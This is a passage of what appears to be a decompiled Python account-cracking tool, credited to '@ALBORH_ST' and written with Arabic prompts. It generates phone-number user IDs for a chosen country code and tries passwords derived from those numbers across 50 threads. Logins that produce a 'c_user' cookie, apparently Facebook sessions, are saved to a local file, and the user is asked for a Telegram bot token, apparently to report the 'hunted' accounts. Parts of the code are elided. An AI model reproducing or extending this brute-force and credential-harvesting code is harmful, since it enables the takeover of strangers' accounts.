...
g = datetime.datetime(2023, 12, 20, 0, 0, 0)
# if x.strftime('%x') > g.strftime('%x'):
    # print('\n\n')
    # print('     تم توقيف اداة راسل المطور لتفعيله المدفوع @PR_7N')
    # print('\n\n')
    # print(x)
    # sys.exit(0)
# if x.strftime('%x') == g.strftime('%x'):
    ...
    # if x.strftime('%X') > g.strftime('%X'):
        # print('\n\n')
        # print('     انتهى وقت تفعيل الاداة للاشتراك المدفوع راسل المطور @PR_7N')
        # print('\n\n')
        # print(x)
        # sys.exit(0)
    # else:
...
BLUE = '\x1b[1;33m'
print( ('{🌹}'*6)+'\n• DeCoDe By @ALBORH_ST •\n'+('{❤}'*6))
print('\x1b[1;34m ادخل توكن بوتك')
token = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ')
print('')
print('\x1b[1;34m ادخل ايدي بوتك')
ID = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐈𝐃  : ')
tlg1 = '\n𝚆𝙴𝙻𝙲𝙾𝙼𝙴 -مرحب بك في اداة  بوره\n𓅃━━━━━━━━❖━━━━━━━━━𓅃\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة المدفوعه يمكنك صيد اكثر من 20حساب فقط كن صبور\n\nقناه المطور  @ALBORH_ST\n    \nلا تـنسى ان تـرسل صـور الـصيد -  @ALBORH_ST\n\n𓅃━━━━━━━━❖━━━━━━━━━𓅃 '
...
def i():
    ...
    jalan('logo')
    print(('🌹'*25)+'\n• DeCoDe By @ALBORH_ST •\n'+('❤'*25))
    jalan('\x1b[1;36m𝑨𝑳𝑩𝑶𝑹𝑯 - @ALBORH_ST')
    print(('🌹'*25)+'\n• DeCoDe By @ALBORH_ST •\n'+('❤'*25))
    
    print(('🌹'*25)+'\n• DeCoDe By @ALBORH_ST •\n'+('❤'*25))
    code = input('\x1b[1;32minter the cod - ادخل كود دولتك:  ')
    os.system('clear')
    limit = 10000
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\x1b[1;92m  عدد الايديات المستهدفه: ' + tl)
        print('\x1b[1;97m BY = @ALBORH_ST')
        for love in user:
            pwx = [
                love[1:]]
            uid = code + love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/ALBORH-ok.txt', 'a').write(cid + ' | ' + ps + '\n')
                oks.append(cid)
        ...
        loop += 1
        (sys.stdout.write('\r%s{\x1b[1;33m [𝑨𝑳𝑩𝑶𝑹𝑯] %s/%s ➙ \x1b[1;95m[ [𝐓𝐑𝐔𝐄]] %s ➙\x1b[1;31m [ [𝐁𝐋𝐎𝐂𝐊]] %s\r' % (H, loop, tl, len(oks), len(cps))),)
        sys.stdout.flush()
    except:
        pass
...
def cek_ALBORH(coki):
    ...
    try:
        for i in range(len(game)):
            print('\r%s  \x1b[0m              𝑨𝑳𝑩𝑶𝑹𝑯=> %s%s' % (P, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada')))
    except:
    ...
    try:
        for i in range(len(game)):
            print('\r%s  \x1b[0m              𝑨𝑳𝑩𝑶𝑹𝑯=> %s' % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
    except:
